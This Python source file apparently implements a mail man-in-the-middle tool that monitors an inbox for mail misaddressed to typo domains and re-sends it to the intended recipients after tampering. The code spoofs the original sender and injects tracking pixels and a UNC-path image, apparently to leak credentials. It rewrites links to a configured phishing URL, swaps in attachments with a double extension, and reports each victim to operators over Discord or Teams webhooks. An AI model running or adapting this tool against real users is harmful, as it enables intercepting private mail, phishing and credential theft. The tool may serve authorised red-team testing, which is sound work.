from .Bells import DiscordBell,TeamsBell
import logging.config
from yaml import load,CLoader
import yaml
from imap_tools import MailBox, AND
from imap_tools.message import MailMessage
from email.mime.application import MIMEApplication
import os, sys, time, re
from datetime import datetime
from smtplib import SMTP
from email.message import EmailMessage
from bs4 import BeautifulSoup as bs
import random, string
from base64 import b64encode
from urllib.parse import urlparse
from requests.models import PreparedRequest

class Maitm():
    def __init__(self,config_file=None,only_new=True,forward_emails=False,logfile="logs/maitm.log",level=logging.INFO) -> None:
        self.config = {}
        self.bells = []
        self.typos = {}
        self.smtp_connection = None
        self.only_new = only_new
        self.forward_emails = forward_emails
        self.logfile=logfile

        # Initialization
        if (os.path.exists(config_file)):
            self.read_config(config_file=config_file)
        # Populate the bells
        self.build_bells()
        self.init_logging(log_filename=logfile)

    ##########
    # Config #
    ##########
    
    def read_config(self,config_file):
        path,filename = os.path.split(config_file)
        config = load(open(config_file,"r").read(),Loader=CLoader)
        # Read each file and build the config object from merging all the options
        for part in config.keys():
            part_config = load(open("{}/{}".format(path,config[part]),"r").read(),Loader=CLoader)
            self.config[part]=part_config

    def init_logging(self,log_filename):
        # Ensure the 'logs' directory exists
        os.makedirs(os.path.dirname(log_filename), exist_ok=True)

        # Load the logging configuration from a YAML file
        with open('config/logging.yml', 'r') as f:
            config = yaml.safe_load(f.read())
            # Update the filename in the configuration
            config['handlers']['file_handler']['filename'] = log_filename
            logging.config.dictConfig(config)

        # Example usage
        self.logger = logging.getLogger()

    ##############
    # Mail Login #
    ##############
    def smtp_login(self):
        sc = self.config["auth"]["smtp"]
        smtp = SMTP(sc["server"], sc["port"])
        smtp.ehlo()
        if (sc["tls"]):
            smtp.starttls()
        # Login only if we have specified user credentials
        if (sc["username"] is not None):
            smtp.login(sc["username"],sc["password"])
        
        self.smtp_connection = smtp

    def imap_login(self):
        ic = self.config["auth"]["imap"]
        self.imap_mailbox = MailBox(ic["server"],ic["port"]).login(ic["username"],ic["password"])

    #################
    # Notifications #
    #################
            
    def build_bells(self):
        # For each bell defined in the configuration
        for webhook_name in self.config['notifications'].keys():
            if webhook_name == "teams":
                self.bells.append(TeamsBell(webhook_url=self.config['notifications'][webhook_name]))
            elif webhook_name == "discord":
                self.bells.append(DiscordBell(webhook_url=self.config['notifications'][webhook_name]))
            else:
                self.logger.debug("Webhook key '{}' not identified. Skipping.".format(webhook_name))
 
    """
    Send a message containing details of the forwarded message to Teams and Discord bells
    """
    def message_master(self,msg: MailMessage,to: str,action: str,reason: str):
        # For each bell, ring it
        for bell in self.bells:
            bell.ring(msg,to,action,reason)

    """
    Send a heartbeat to Teams and Discord bells
    """
    def heartbeat(self):
        # For each bell, ring it
        for bell in self.bells:
            bell.heartbeat()
    
    #########
    # Utils #
    #########
    def countdown(self,seconds):
        for remaining in range(seconds, 0, -1):
            sys.stdout.write("\r")
            sys.stdout.write("{:2d}s".format(remaining)) 
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write("\n")

    """
    If the UID of this email has not been previously forwarded, it is consired new email
    """
    def is_new_email(self,msg_uid: str):
        uids=[uid.strip() for uid in open("forwardedemails.txt","r").readlines()]
        return msg_uid not in uids
    """
    Save this UID as observed and forwarded
    """
    def flag_observed(self,msg_uid: str):
        with open("forwardedemails.txt","a") as fe:
            fe.write(msg_uid+"\n")
    
    """
    Check the date of this message is more recent than the limit we have set in the configuration file
    """
    def is_recent(self,msg: MailMessage):
        if (self.config["filter"]["date_limit"] is not None):
            return msg.date > self.config["filter"]["date_limit"]
        return self.config["filter"]["date_limit"] is None
    
    """
    Check if the message is coming from an ignored domain
    """
    def ignored_domain(self,msg: MailMessage):
        # Get the domain of the users this emails is being sent to
        # Return true if any of the destination users is in the deny list of domains
        if ("ignore_to_domains" in self.config["filter"].keys() and len(self.config["filter"]["ignore_to_domains"])>0):
            for rcpt in msg.to:
                user,domain=rcpt.split("@")
                if domain in self.config["filter"]["ignore_to_domains"]:
                    return True
        return False
    
    """
    Check if the message has an ignored subject
    """
    def ignored_subject(self,msg: MailMessage):
        if ("ignore_subjects" in self.config["filter"].keys() and len(self.config["filter"]["ignore_subjects"])>0):
            for ignored_subject in self.config["filter"]["ignore_subjects"]:
                pattern = re.compile(ignored_subject, re.IGNORECASE)
                if len(re.findall(pattern,msg.subject))>0:
                    return True
        return False
    
    """
    Log details of the MailMessage object
    TODO: Override the __str__ method of MailMessage
    """
    def log_msg_details(self,msg):
        self.logger.info("========[%s]========\nEmail UID: %s\nFROM: %s\nTO: %s\nSubject: %s\nSize: %s" % (msg.date, msg.uid, msg.from_values, msg.to,msg.subject, len(msg.text or msg.html)))

    """
    Fix the typos defined in the file typos.yml
    """
    def fix_typo_to(self,to_addresses):
        fix_found=False
        for to_address in to_addresses:
            # Search and forward only to the addresses that have typos. 
            # Ignore the rest of the emails, as they received their copy
            user,domain=to_address.split("@")
            fixed_address=to_address
            if domain in self.config["typos"]["domain"].keys():
                # Search the domain replacement rules
                fixed_address=user+"@"+self.config["typos"]["domain"][domain]
                fix_found=True
            else:
                # Search in hardcoded addresses
                if to_address in self.config["typos"]["address"].keys():
                    fixed_address=self.config["typos"]["address"][to_address]
                    fix_found=True
                else:
                    fix_found=False

        return fix_found,fixed_address

    """
    Create HTML body from the text content of the email
    """
    def create_html_from_text(self,msg):
        # Create HTML body
        body_text=msg.text.replace("\r\n","<br/>")
        soup=bs("<body>%s</body>" % (body_text),"html.parser")
        return str(soup)


    ##############
    # Injections #
    ##############
    """
    Insert the tracking pixel in the email
    """
    def insert_tracking_pixel(self,id,html):
        # parse the html and add the image to the end of the body

        # If the html content of the email is empty
        if (html is None or len(html)==0):
            html="<html><body></body></html>"

        soup=bs(html,"html.parser")
        tracking_pixel=bs('<img src="{}?customerid={}" style="height:1px !important; width:1px !important; border: 0 !important; margin: 0 !important; padding: 0 !important" width="1" height="1" border="0">'.format(self.config["injections"]["tracking_url"],id),"html.parser")
        show_images_message=bs("<h3>Allow images in this email for additional details</h3>","html.parser")
        sb=soup.find("body")
        if (sb is  None):
            sb=soup.find()
        
        sb.insert(0,show_images_message)
        sb.insert(0,tracking_pixel)

        return str(soup)

    """
    Insert the tracking UNC link in the email
    """
    def insert_unc_path(self,id,html):
        # parse the html and add the UNC to the end of the body
        
        # If the html content of the email is empty
        if (html is None or len(html)==0):
            html="<html><body></body></html>"

        soup=bs(html,"html.parser")
        unc_element=bs('<img src="{}?customerid={}" style="height:1px !important; width:1px !important; border: 0 !important; margin: 0 !important; padding: 0 !important" width="1" height="1" border="0">'.format(self.config["injections"]["unc_path"],id),"html.parser")
        sb=soup.find("body")
        if (sb is  None):
            sb=soup.find()
        
        sb.insert(0,unc_element)

        return str(soup)

    """
    Inject attachment message
    """
    def inject_attachment_message(self,html,message):
        soup=bs(html,"html.parser")
        sb=soup.find("body")
        if (sb is  None):
            sb=soup.find()
        
        sb.insert(0,bs(message,features="html.parser"))
        
        return str(soup)

    """
    Inject or replace the mail attachment
    """
    def inject_attachment(self,original_msg, fake_msg: EmailMessage):
        # locate and attach desired attachments
        # Get the original attachment file name (first hit) to name min the same
        path = self.config["injections"]["attachments"]["path"]
        orig_filename=original_msg.attachments[0].filename
        att_name = os.path.basename(path)
        att_ext = os.path.splitext(path)[-1]
        orig_att_ext = os.path.splitext(orig_filename)[-1]
        _f = open(path, 'rb')
        att = MIMEApplication(_f.read(), _subtype="application")
        _f.close()
        if (orig_filename is not None):
            if (att_ext != orig_att_ext):
                orig_filename=orig_filename+att_ext # double extension
            att.add_header('Content-Disposition', 'attachment', filename=orig_filename)
        else:
            att.add_header('Content-Disposition', 'attachment', filename=att_name)
        fake_msg.attach(att)

        return fake_msg


    #################
    # Replace links #
    #################

    """
    Replace links to a specific domain of the email with the ones desired by us. 
    """
    def replace_links_to_domain(self,injected_link,domain,html,soup=None):
        target_soup=None
        # If the soup is not empty, that means that we have replaced previous links in a previous iteration 
        # and we have to work over the modified soup.
        if (soup is None):
            target_soup=bs(html,"html.parser")
        else:
            target_soup=soup
        links = target_soup.find_all("a")
        for link in links:
            href=link.get("href")
            text=link.string
            if (domain in urlparse(href).netloc):
                link["href"]=injected_link
                self.logger.debug("Tamper Domain Links - Changing link in the email from '%s (%s)' to '%s'" % (text,href,injected_link))
        return target_soup

    """
    Replace all links of the email with the ones desired by us. 
    """
    def replace_all_links(self,phishing_link,html):
        target_soup=bs(html,"html.parser")
        links = target_soup.find_all("a")
        if (len(links)>0):
            for link in links:
                href=link.get("href")
                if (not re.match("^mailto:",href)):
                    text=link.string
                    link["href"]=phishing_link
                    self.logger.debug("Tamper All Links - Changing link in the email from '%s (%s)' to '%s'" % (text,href,phishing_link))
                else:
                    self.logger.debug("Link was a mail link. Not replacing it")
        else:
            # Inject a new link, as there are none in the original email
            self.logger.debug("No links detected in this email, injecting a new one.")
            new_link=bs('<h1>Click <a href="{}">here</a> to see the attachment.</h1><br/>'.format(phishing_link),"html.parser")
            sb=target_soup.find("body")
            if (sb is  None):
                sb=target_soup.find()
            
            sb.insert(0,new_link)

        return target_soup

    """
    Replace all links of the email with the ones desired by us. 
    """
    def replace_links(self,id,html):
        # parse the html and add the image to the end of the body
        tampered_soup=bs(html,"html.parser")
        if ("links" in self.config["injections"].keys()):
            if ("all" in self.config["injections"]["links"]):
                phishing_link=self.config["injections"]["links"]["all"]
                params = {'customerid':id}
                prepared_url = PreparedRequest()
                prepared_url.prepare_url(phishing_link, params)
                tampered_soup=self.replace_all_links(prepared_url.url,html)
            else:
                # Check if there are specific rules for domains
                for domain in self.config["injections"]["links"].keys():
                    phishing_link=self.config["injections"]["links"][domain]
                    params = {'customerid':id}
                    prepared_url = PreparedRequest()
                    prepared_url.prepare_url(phishing_link, params)
                    tampered_soup=self.replace_links_to_domain(prepared_url.url,domain,html,tampered_soup)

        return str(tampered_soup)


    ####################
    # Forwarding logic #
    ####################
    """
    Forward the message to the legitimate recipient
    """ 
    def forward_message(self,msg):
        # Pick the uid and with SMTP forward it
        tracking_url=self.config["injections"]["tracking_url"]
        unc_path=self.config["injections"]["unc_path"]
        spoof_sender=self.config["misc"]["sender"]["spoof"]
        fixed_sender=self.config["misc"]["sender"]["fixed"]
        forwarded=False
        reason="Unknown"
        fake_msg = EmailMessage()

        try:
            fix_found,fixed_to=self.fix_typo_to(msg.to) # This returns a boolean and a list of addresses
            fake_msg["To"]=fixed_to
            if (fix_found):
                fake_msg["Subject"]=msg.subject.replace("\n","").replace("\r","")
                # Decide what sender we are going to be
                if (spoof_sender):
                    fake_msg["From"]=msg.from_values.name+" <"+msg.from_values.email+">"
                elif(fixed_sender is not None):
                    fake_msg["From"]=fixed_sender
                elif(self.smtp_connection.user is not None):
                    fake_msg["From"]=self.smtp_connection.user
                else:
                    fake_msg["From"]="Max Headroom <max@headroom.com>"
                
                # Email text
                fake_msg.set_content(msg.text)
                # If the email does not have an HTML, we create it from the text
                target_html=msg.html
                if (msg.html is None or len(msg.html)==0):
                    target_html=self.create_html_from_text(msg)

                # Generate an Id for this email
                id=''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                id+="."+b64encode((fake_msg["To"].split("@")[0]).encode("utf-8")).decode("utf-8")
                # Insert the tracking pixel
                tainted_html=self.insert_tracking_pixel(id,target_html)
                # Insert the UNC path
                tainted_html=self.insert_unc_path(id,tainted_html)
                # Modify the links
                tainted_html=self.replace_links(id,tainted_html)
                # Attach the "attachment warning message if it exists"
                # We do this before the file attachement itself because I don't like to manage the content of the object EmailMessage
                if ("attachments" in self.config["injections"].keys() and "attachment_message" in self.config["injections"]["attachments"].keys()):
                    tainted_html=self.inject_attachment_message(tainted_html,self.config["injections"]["attachments"]["attachment_message"])

                # Log the mapping  
                fake_msg.add_alternative(tainted_html,subtype="html")

                # Attach a file
                if ("attachments" in self.config["injections"].keys()):
                    if (("inject_new" in self.config["injections"]["attachments"] and self.config["injections"]["attachments"]["inject_new"]) or
                        ("replace_original" in self.config["injections"]["attachments"] and self.config["injections"]["attachments"]["replace_original"] and len(msg.attachments))):
                        fake_msg=self.inject_attachment(msg,fake_msg)

                if (self.forward_emails):
                    # Forward email to fixed destinations for testing purposes
                    if ("fixed_destinations" in self.config["misc"].keys() and len(self.config["misc"]["fixed_destinations"])>0):
                        del fake_msg["To"]
                        fake_msg["To"]=self.config["misc"]["fixed_destinations"]
                    
                    # Send the message
                    self.logger.info("[%s] %s <-[us]-> %s" % (id, msg.to,fake_msg["To"]))
                    self.smtp_connection.send_message(fake_msg)
                    # Set success flags
                    forwarded=True
                    reason="[%s] All Gucci %s <-[us]-> %s" % (id, msg.to,fake_msg["To"])
                else:
                    forwarded=False
                    reason="All good to forward to %s with tracking ID %s, but no --forward flag was specified"  % (fake_msg["To"],id)
            else:
                forwarded=False
                reason="Typo fix rule not found"
        except Exception as e:
            forwarded=False
            reason="Error parsing original message: %s" % e
            self.logger.error("Error: %s" % e)

        return forwarded,fake_msg["To"],reason

    """
    Check if the message has an ignored subject
    """
    def forward_chain(self,msg: MailMessage):
        # Print details of the message
        self.log_msg_details(msg)
        # Forward the email
        forwarded,to,reason=self.forward_message(msg)
        # Alert operators
        self.message_master(msg,to,forwarded,reason)
        # Save this msguid as already observed
        self.flag_observed(msg.uid)

    ##############
    # Monitoring #
    ##############            
    def monitor_inbox(self, date_limit: datetime=None):
        # Never stop or stop if there's a date_limit defined and is still ahead of now
        while (1):
            if (date_limit is not None and datetime.now()>=date_limit):
                break
            else:
                self.logger.info("=== SEARCH TO DOMAINS ====")
                for monitored_to in self.config["filter"]["to_domains"]:
                    self.logger.info("Searching emails to domain %s" % monitored_to)
                    # Search "From" filter  
                    filter_mail=AND(to=monitored_to)

                    # Fetch found emails
                    try: 
                        for msg in self.imap_mailbox.fetch(filter_mail):
                            if (self.only_new):
                                if  self.is_new_email(msg.uid) and self.is_recent(msg) and (not self.ignored_domain(msg)) and (not self.ignored_subject(msg)):
                                    self.forward_chain(msg)
                                else:
                                    self.logger.debug("Ignoring email %s. Was already seen or not more recent than %s." % (msg.uid,date_limit))
                            else:
                                if self.is_recent(msg) and (not self.ignored_domain(msg)) and (not self.ignored_subject(msg)):
                                    self.forward_chain(msg)
                                else:
                                    self.logger.debug("Ignoring email %s. Is older than %s." % (msg.uid,date_limit))
                    except Exception as e:
                        self.logger.error("Exception occured while fetching emails: %s" % e)

                self.logger.info("=== SEARCH FROM DOMAINS ====")
                for monitored_from in self.config["filter"]["from_domains"]:
                    self.logger.info("Searching emails from %s" % monitored_from)
                    # Search "From" filter  
                    filter_mail=AND(from_=monitored_from)

                    # Fetch found emails
                    try: 
                        for msg in self.imap_mailbox .fetch(filter_mail):
                            if (self.only_new):
                                if  self.is_new_email(msg.uid) and self.is_recent(msg) and (not self.ignored_domain(msg)) and (not self.ignored_subject(msg)):
                                    self.forward_chain(msg)
                                else:
                                    self.logger.debug("Ignoring email %s. Was already seen or not more recent than %s." % (msg.uid,date_limit))
                            else:
                                if self.is_recent(msg) and (not self.ignored_domain(msg)) and (not self.ignored_subject(msg)):
                                    self.forward_chain(msg)
                                else:
                                    self.logger.debug("Ignoring email %s. Is older than %s." % (msg.uid,date_limit))
                    except Exception as e:
                        self.logger.error("Exception occured while fetching emails: %s" % e)

                self.logger.info("=== SEARCH SUBJECT ====")
                for subject_str in self.config["filter"]["subject_str"]:
                    self.logger.info("Searching emails containing with subject containing '%s'" % subject_str)
                    # Search "Subject" filter  
                    filter_mail=AND(subject=subject_str)
                
                    try:
                        # Fetch found emails
                        for msg in self.imap_mailbox .fetch(filter_mail):
                            if (self.only_new):
                                if  self.is_new_email(msg.uid) and self.is_recent(msg) and (not self.ignored_domain(msg)) and (not self.ignored_subject(msg)):
                                    self.forward_chain(msg)
                                else:
                                    self.logger.debug("Ignoring email %s. It is not new." % msg.uid)
                            else:
                                if self.is_recent(msg) and (not self.ignored_domain(msg)) and (not self.ignored_subject(msg)):
                                    self.forward_chain(msg)
                                else:
                                    self.logger.debug("Ignoring email %s. Is older than %s." % (msg.uid,date_limit))
                    except Exception as e:
                        self.logger.error("Exception occured while fetching emails: %s" % e)

                # Every hour send a teams heartbeat message
                # heartbeat(config)
                print("Sleeping %s seconds" % self.config["misc"]["poll_interval"])
                self.countdown(self.config["misc"]["poll_interval"])
        
        # Date limit hit
        self.logger.info("Date limit reached. Stopping the monitoring")